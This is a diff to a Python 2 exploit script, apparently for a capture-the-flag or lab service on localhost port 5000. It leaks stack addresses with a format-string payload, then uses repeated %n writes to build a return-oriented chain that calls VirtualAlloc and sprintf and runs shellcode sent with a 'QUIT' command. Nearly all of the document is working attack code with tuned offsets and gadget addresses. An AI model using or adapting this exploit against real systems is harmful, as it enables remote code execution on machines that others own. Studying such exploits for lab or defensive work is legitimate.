@@ -2,6 +2,7 @@ import socket
 import struct
 import time
 
+
 host = "127.0.0.1"
 port = 5000
 
@@ -63,51 +64,51 @@ def fmt(addr_temp, dest, s):
 			time.sleep(0.5)
 			s.send(payload)
 
-		#print 'trigger'
-
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host, port))
 
 time.sleep(0.5)
-payload = '\x00\x02\x00\x00%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'
+payload = '\x00\x04\x00\x00%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'
 s.send(payload)
 time.sleep(0.5)
 a = s.recv(1024)
 
-addr_buf = int(a[183:191], 16)
-addr_ret = addr_buf + 0x204
-addr_stack = int(a[183:187] + '6000', 16)
-addr_4byteFirst = a[167:171]
-edi = int(addr_4byteFirst + '1000', 16)
-esi = int('100c', 16)
+addr_buf = int(a[191:199], 16)
+addr_ret = addr_buf + 0x40c
+addr_stack = int(a[191:195] + '6000', 16)
+addr_4byteFirst =  a[175:179]
+edi = int(addr_4byteFirst + 'a000', 16)
+esi = int('1070', 16)
 
 payload2 = '%p%p%p%p%p%24p%n' +  struct.pack('<I', addr_ret+48)  
 pl_quit = 'QUIT'  + shell
 
-print 'buf = ' + a[183:191]
-print '4byteF = ' + a[167:171]
-print 'Send payload'
-
-fmt(0x65701e04, addr_ret, s)		#pop edi pop esi ....
+print 'buf = ' + a[191:199]
+print '4byteF = ' + a[175:179]
+print "Send payload"
+	
+fmt(0x65701e04, addr_ret, s)					#pop edi, pop esi
 fmt(edi, addr_ret+4, s)
 fmt(esi, addr_ret+8, s)
-fmt(0x65703983, addr_ret+16, s)		#jmp [edi+esi] = virtualAlloc
-fmt(0x65701e04, addr_ret+32, s)		#pop edi pop esi ....
-
-fmt(addr_stack, addr_ret+36, s)		#param virtualAlloc
+fmt(0x65703983, addr_ret+16, s)					#jmp [edi+esi]
+fmt(int(addr_4byteFirst + '157b', 16), addr_ret+32, s)					#0x6570346a
+fmt(addr_stack, addr_ret+36, s)
 fmt(0xa000, addr_ret+40, s)
 fmt(0x1000, addr_ret+44, s)
 s.send(payload2)
+fmt(addr_stack, addr_ret+52, s)		#return sprintf
+fmt(addr_stack, addr_ret+56, s)		#return sprintf
+fmt(addr_buf+4, addr_ret+60, s)
+#fmt(addr_buf+4, addr_ret+52, s)
+#fmt(0x65701f8e, addr_ret+56, s)
 
-fmt(int(addr_4byteFirst + '1000', 16), addr_ret+52, s)
-fmt(int('10BC', 16), addr_ret+56, s)
-fmt(0x65703983, addr_ret+64, s)		#jmp [edi+esi] = sprintf
 
 fmt(addr_stack, addr_ret+80, s)		#return sprintf
 fmt(addr_stack, addr_ret+84, s)		#param sprintf
 fmt(addr_buf+4, addr_ret+88, s)
 time.sleep(0.5)
 s.send(pl_quit)
+
 
 print 'done'
